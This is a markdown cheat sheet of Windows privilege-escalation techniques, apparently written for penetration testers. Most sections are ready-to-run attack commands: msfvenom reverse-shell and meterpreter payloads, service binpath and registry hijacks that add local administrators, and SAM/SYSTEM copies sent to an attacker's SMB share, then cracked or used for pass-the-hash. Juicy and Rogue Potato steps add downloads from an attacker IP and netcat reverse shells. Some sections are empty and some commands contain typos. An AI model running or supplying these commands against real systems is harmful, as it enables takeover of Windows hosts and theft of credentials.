- [Registry Always InstallElevated method](#Registry-Always-InstallElevated-Method)
- [Insecure Service Permissions](#Insecure-Service-Permissions)
- [Weak Registery Permissions](#Weak-Registery-Permissions)
- [Unquoted Service Paths](#Unquoted-Service-Paths)
- [Registry Autorun](#Registry-Autorun)
- [binPath](#binPath)
- [Hot Potato](#HotPotato)
- [Password](#Password)
     - [Registry](#Registry)
     - [Save creds](#Saved-creds)
     - [SAM](#SAM)
     - [Pass the hash](#Pass-the-hash)
- [Kernel Exploits](#Kernel-Exploits)
- [Insecure Service Executables](#Insecure-Service-Executables)
- [Startup Applications](#Startup-Applications)
- [Scheduled tasks](#Scheduled-tasks)
- [Token Impersonation](#Token-Impersonation)
     - [Rogue Potato](#Rogue-Potato)
     - [Juicy Potato](#Juicy-Potato)
     - [PrintSpoofer](#PrintSpoofer)
- [Insecure GUI Apps](#Insecure-GUI-Apps)
-------------------------------------------------------------------------------------------------------------------------------
# Always InstallElevated Method

For this purpose the AlwaysInstallElevated policy feature is used to install a MSI package file with elevated (system) privileges.
his policy if enabled in the Local Group Policy editor; directs the Windows Installer engine to use elevated permissions when it installs 
any program on the system.
From the security point of view this can be abused by an attacker in order to escalate his privileges to the box to SYSTEM.

### Check registry keys
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- Value **0x1** means that the AlwaysInstallElevated policy is enabled

### Privilege Escalation with Metasploit
```
use exploit/windows/local/always_install_elevated
set session ?
set LHOST 192.168.100.1
exploit
```

### Create MSI Package with PowerSploit
```
PS C:\Users\test> Import-Module Privesc
PS C:\Users\test> Get-RegistryAlwaysInstallElevated
PS C:\users\test> Write-UserAddMSI
```

### Create MSI Package with msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<local_ip_address> lport=<local_port> –f msi > malicious.msi
```

### Execute the MSI package file on the Windows command prompt
```
>msiexec /quiet /qn /i malicious.msi

/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

#### Mitigation
- Disable below settings from the GPO
```
Computer Configuration\Administrative Templates\Windows Components\Windows Installer
User Configuration\Administrative Templates\Windows Components\Windows Installer
```
-------------------------------------------------------------------------------------------------------------------------------
# Insecure Service Permissions

Unconfigured Windows OS services allows some users to configure them.

### Check services 
Check which services we have permissions for logged in users "user". **RW** Persmissions.
If we have permissions on the service we can change the the executable file location on the target system.

### List potentially vulnerable services
- One
```
accesschk.exe -uwcqv *
```
- Two
```
accesschk64.exe -uwcqv "<user_name>" *
```
- Three
```
accesschk64.exe -uws "Everyone" "C:\Program Files"
```
- Four (Powershell)
```
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_AccessToString -match "Everyone\sAllow\s\sModfiy"}
```

### Create msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o malicious.exe
```

### Change service path
```
sc config <service-name> binpath="c:\users\tester\appdata\local\temp\malicious.exe"
```

### Check service path
```
sc -qc <service_name>
```
-------------------------------------------------------------------------------------------------------------------------------
# Weak Registery Permissions

Increase when a service that everyone can change the service PATH in registery records.
**IMPORTANT** Check is the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE"

### Search for interesting service (best alluser in everyone group has full control permission)
- One
```
Wmic service get name | findstr /i /v "C:\Windows\\"
```
- Two (Powershell)
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\<service_name> | fl
```
- Three
```
accesschk64.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service_name>
```

### Check registers records for insecure service (check /pace and Type of Access)
```
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<service_name>" /display
```

### Enumerate the service (Check what service started executes BINARY_PATH_NAME)
```
sc qc <service_name>
```

### Create msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o malicious.exe
```
 
### Change BINARY_PATH
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\<service_name>" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\tester\AppData\Local\Temp\malicious.exe" /f
```

### Start the service(CMD)
```
sc start <service_name>
```
-------------------------------------------------------------------------------------------------------------------------------
# Unquoted Service Paths

When the Windows OS starting a service and If any unquoted(has space) in the PATH the service can be manipulating

### Search for unquotedsvc(Command prompt)
- 1
```
sc qc unquotedsvc
```
- 2
```
wmic service get name,displayname,pathname,startmode |findstr /i /v “C:\Windows\\” | findstr /i /v “””
```
Important, "BINARY_PATH_NAME" field displays a path that is not confined between quotes.

### Create msfvenom payload
- One
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o malicious.exe
```
- Two
```
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o malicious.exe
```

### Place common.exe in Windows OS(Some part of Unquoted Path)

### Run service(Command prompt)
```
sc start unquotedsvc
```
-------------------------------------------------------------------------------------------------------------------------------
# Registry-Autorun

### Check registry for AutoRun executables
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### Check autorun executables permission
```
accesschk64.exe /accepteula -wvu "C:\<your_exe.exe>"
```

### Create msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o malicious.exe
```
- Rename malicious.exe to testing.exe
- Place malicious file in C:\my\testing.exe
-------------------------------------------------------------------------------------------------------------------------------
# binPath

### Searching (CMD)
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```
- Check have we got permission **SERVICE_CHANGE_CONFIG**

### Exploitation(CMD)
- One
```
sc config daclsvc binpath= "net localgroup administrators <user_name> /add"
```

- Two
```
sc start daclsvc
```

- Three
```
type: net localgroup administrators
```
-------------------------------------------------------------------------------------------------------------------------------
# Hot Potato

Windows privilege escalation technique. This vulnerability affects Windows 7, 8, 10, Server 2008, and Server 2012

### Run powershell
```
powershell.exe -nop -ep bypass
```

### Get and Import powershell module
```
Import-Module C:\Tater.ps1
```

### Type in powershell
```
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

### Confirm attack prompt
```
net localgroup administrators
```
-------------------------------------------------------------------------------------------------------------------------------
# Password

## Registry
- Search registry for key and value contains the word "password"
```
reg query HKLM /f password /t REG_SZ /s
```

- Search for admin autologon
```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

- Spawn windows command prompt(kalilinux)
```
winexe -U 'admin%password' //MACHINE_IP cmd.exe
```

## Saved-creds
- List saved credentails
```
cmdkey /list
```
- Privesc, send reverseshell and run listener on Kali. Run
```
runas /savecred /user:admin C:\malicious.exe
```

## SAM
SAM and SYSTEM files can be used to extract user password hashes

- Copy SYSTEM and SAM files 
```
copy C:\Windows\Repair\SAM \\<your_ip\<smb_share>\
copy C:\Windows\Repair\SYSTEM \\<your_ip>\<smb_share>\
```

- Use creddump7
```
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```
- Crack NTLM Hash
```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

## Pass teh Hash
- Use hash with pth-winexe
```
pth-winexe -U 'admin%hash' //<MACHINE_IP> cmd.exe
```
-------------------------------------------------------------------------------------------------------------------------------
# Kernel-Exploits

### Discovery of missing patches
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Metasploit
Module which can quickly identify any missing patches based on the Knowledge Base number and specifically patches for which there is a Metasploit module.
```
msf> use post/windows/gather/enum_patches

set SESSION X

set KB "KB2534111","KB2641251"

run
```

### Windows Exploit Suggester
- On windows machines copy output 
```
systeminfo
```

- Run winodows-exploit-suggester.py --database yourdatabase.xls --systeminfo windows_info.txt

### Powershell
- Use Sherlock script
```
Import-Module C:\Sherlock.ps1
```
- Run Find-AllVulns
```
Find-AllVulns
```
-------------------------------------------------------------------------------------------------------------------------------
# Insecure-Service-Executables

### Enumerate services
- All services
```
sc query state= all
```
- filepermsvc service
```
sc qc filepermsvc
```
### Check binary service
```
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```
- Check the file is writable

### Create malicious file
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip_address> -f exe -o filepermservice.exe

- msfconsole
- use multi/handler
- set payload windows/meterpreter/reverse_tcp
- set lhost <your_ip_address>
- run

- Place malicious.exe in "C:\Program Files\File Permissions Service\filepermservice.exe"

### Start service
```
net start filepermsvc
```

-------------------------------------------------------------------------------------------------------------------------------
# Startup Applications

### Enumerate startup application
- Tool one
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
- Tool two
```
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
- Check access for your account

### Create malicious file
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip_address> -f exe -o malicious.exe
- msfconsole
- use multi/handler
- set payload windows/meterpreter/reverse_tcp
- set lhost <your_ip_address>
- run

- Place malicious.exe in "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

### Wait for admin login
-------------------------------------------------------------------------------------------------------------------------------
# Scheduled tasks

## View all existing tasks
```
schtasks /query /fo LIST /v 
```
- Findstr utility can be used tyo search certain text
```
schtasks /query /fo LIST /v | findstr /v "\Text"
```

## Weak File Permissions
- Check file permission 
```
.\accesschk.exe /accepteula -quvw stef C:\Users\Administrator\Desktop\Backup.ps1
```
- Create malicious payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > shell.exe
```
- Edit powershell script
```
echo "path_to_malicious_shell" >> "C:\Users\Administrator\Desktop\Backup.ps1"
```

-------------------------------------------------------------------------------------------------------------------------------
# Token Impersonation

## Hot Potato
This vulnerability affects Windows 7, 8, 10, Server 2008, and Server 2012

## Juicy Potato
#### Attack Requirements
- User account usually a service account with the impersonation privileges of SeImpersonatePrivilege or/and SeAssignPrimaryTokenPrivilege enabled.
- A COM server with a unique CLSID:
```
http://ohpe.it/juicy-potato/CLSID/
```

#### Exploitation
- Check SeImpersonatePrivilege is Enable
```
>whoami /priv
```
- download binary
```
https://github.com/ohpe/juicy-potato/releases
```
- upload binary
```
powershell "IEX(New-Object Net.WebClient).downloadFile('http://[ip_address]/JuicyPotato.exe', c:\J.exe')" -bypass executionpolicy
```
- To run the tool, we need a port number for the COM server and a valid CLSID
We can either use the provided list by the tool authors based on the version of the system or run the below PowerShell command to extract the CLSID of the current system.
![image](https://user-images.githubusercontent.com/49185097/122955725-590f0b00-d34e-11eb-919d-b15c10f32188.png)
- Run script
```
powershell -executionpolicy bypass -file GetCLSID.ps1 > clsid.txt
```
- Create bat file
```
c:\Users\test\nc.exe -e cmd.exe <ip> <port> > my.bat
```
- Run juicypotato.exe
```
J.exe -p c:\Users\test\my.bat -l 9003 -t * -c {CLSID from the extracted list}

-l <same as the one in the bat file>
```

## Rogue Potato
- Check SeImpersonatePrivilege status (is enable?)
```
whoami /priv
```
- Run RogueWinRM.exe
- For running an interactive cmd
```
Run RogueWinRM.exe -p C:\windows\system32\cmd.exe
```
- For running netcat reverse shell
```
RogueWinRM.exe -p C:\windows\temp\nc64.exe -a "<IP> <PORT> -e cmd"
```

## PrintSpoofer
-------------------------------------------------------------------------------------------------------------------------------
# Insecure GUI Apps


